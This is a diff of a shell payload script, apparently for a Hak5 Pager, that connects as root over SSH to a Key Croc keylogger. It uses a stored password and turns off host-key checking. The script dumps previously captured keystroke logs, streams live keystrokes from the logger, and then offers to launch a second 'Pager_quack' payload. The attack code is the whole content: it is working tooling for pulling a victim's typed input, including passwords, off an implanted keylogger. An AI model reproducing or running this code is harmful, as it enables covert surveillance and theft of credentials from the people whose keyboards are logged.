@@ -3,9 +3,10 @@
 # Title:  Pager_keystrokes
 # Author: spywill
 # Description: Read previous and live keystrokes from your Keycroc
-# Version: 1.2
+# Version: 1.3
 
-trap 'exit 0' INT TERM EXIT
+trap 'exit' INT TERM EXIT
+quack_payload="/mmc/root/payloads/user/remote_access/Pager_quack/payload.sh"
 remote_file="/root/loot/croc_char.log"
 PASS_FILE="/mmc/root/payloads/user/remote_access/Pager_keystrokes/croc_passwd.txt"
 CROC_IP_FILE="/mmc/root/payloads/user/remote_access/Pager_keystrokes/croc_IP.txt"
@@ -118,9 +119,11 @@ Select the checkmark to continue.")
 case "$resp" in
 	$DUCKYSCRIPT_USER_CONFIRMED)
 		LOG green "Previous keystrokes (croc_char.log)"
+		LOG yellow "IP: $croc_ip"
 		spinnerid=$(START_SPINNER "Collecting keystroke...")
-		OUTPUT=$(sshpass -p "$croc_passwd" ssh -o StrictHostKeyChecking=no root@$croc_ip "
-		find / -type f -name 'croc_char.log' 2>/dev/null -exec sh -c '
+		OUTPUT=$(
+		/mmc/usr/bin/sshpass -p "$croc_passwd" ssh -o StrictHostKeyChecking=no root@"$croc_ip" '
+		find / -type f -name "croc_char.log" 2>/dev/null -exec sh -c "
 		for file do
 			chars=\$(wc -m < \"\$file\")
 			echo \"File: \$file\"
@@ -129,7 +132,9 @@ case "$resp" in
 			strings \"\$file\"
 			echo
 		done
-		' sh {} +")
+		" sh {} +
+		'
+		)
 		echo "$OUTPUT" > $SAVE_KEYSTROKE
 		LOG $(cat $SAVE_KEYSTROKE)
 		STOP_SPINNER ${spinnerid}
@@ -148,27 +153,36 @@ case "$resp" in
 		;;
 esac
 
-# Get remote file size
-size=$(sshpass -p "$croc_passwd" ssh -o StrictHostKeyChecking=no root@$croc_ip \
-	"stat -c %s '$remote_file' 2>/dev/null || echo 0")
+/mmc/usr/bin/sshpass -p "$croc_passwd" ssh -o StrictHostKeyChecking=no root@$croc_ip \
+    "tail -c 10 -f '$remote_file'" |
+while IFS= read -r -n1 char; do
+    LOG "$char"
+done &
 
-# Start offset at last 10 bytes (never below 0)
-offset=$(( size > 10 ? size - 10 : 0 ))
+WAIT_FOR_BUTTON_PRESS A
+pgrep -f "ssh -o StrictHostKeyChecking=no root@$croc_ip" | xargs -r kill
 
-while true; do
-	size=$(sshpass -p "$croc_passwd" ssh -o StrictHostKeyChecking=no root@$croc_ip \
-		"stat -c %s '$remote_file' 2>/dev/null || echo 0")
-    # Handle log truncation / rotation
-	if (( size < offset )); then
-		offset=$size
-	fi
-	if (( size > offset )); then
-		sshpass -p "$croc_passwd" ssh -o StrictHostKeyChecking=no root@$croc_ip \
-			"dd if='$remote_file' bs=1 skip=$offset count=$((size-offset)) 2>/dev/null" |
-		while IFS= read -r -n1 char; do
-			LOG "$char"
-		done
-		offset=$size
-	fi
-	sleep 0.1
-done
+sleep 2
+resp=$(CONFIRMATION_DIALOG "Start Pager_quack payload
+
+ensure Pager_quack payload is installed")
+case "$resp" in
+	$DUCKYSCRIPT_USER_CONFIRMED)
+		if [ -f "$quack_payload" ]; then
+			LOG "Starting Pager_quack payload"
+			export DUCKYSCRIPT_USER_CONFIRMED="1"
+			source $quack_payload
+		else
+			LOG red "$keystroke_quack missing or empty"
+			exit 1
+		fi
+		;;
+	$DUCKYSCRIPT_USER_DENIED)
+		LOG "User selected no"
+		exit 1
+		;;
+	*)
+		LOG "Unknown response: $resp"
+		exit 1
+		;;
+esac
